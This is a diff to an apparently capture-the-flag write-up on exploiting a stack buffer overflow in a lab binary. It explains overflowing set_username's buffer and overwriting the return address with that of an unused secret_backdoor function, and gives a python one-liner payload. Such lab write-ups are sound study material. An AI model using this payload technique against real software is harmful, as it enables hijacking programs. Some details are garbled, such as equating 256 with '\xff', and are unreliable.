@@ -42,14 +42,14 @@ By decompiling the binary, there are a function that never called, name `secret_
 
 
 XXXXXXXXXXXXXXXXXXXXXXX
-decompilation gives the set_username function will take `0x29 = 40` bytes into the buffer.
+decompilation gives the set_username function will take `0x29 = 40` bytes into the buffer. the buffer after, we want to feed `256 = '\xff'`, so that the value initially set up, which is 140, will be able extend the length of `strncpy()`.
 XXXXXXXXXXXXXXXXXXXXXXX
 
 XXXXXXXXXXXXXXXXXXXXXXXXXXXX
-We want to overwrite the rip (64 bits version of eip) to the address of the function `secret_backdoor`
+We want to overwrite the rip (64 bits version of eip) to the address of the function `secret_backdoor`. but the address only will be right once you `run` the program.
 XXXXXXXXXXXXXXXXXXXXXXXXXXXX
 
 
 ```
-python -c 'import struct; print "A"*40 + "\x90" + "B"*200 + struct.pack("L", 0x000055555555488c)' # I stands for unsigned int, L stands for unsigned long
+python -c 'import struct; print "A"*40 + "\x90\n" + "B"*200 + struct.pack("L", 0x000055555555488c)' # I stands for unsigned int, L stands for unsigned long
 ````
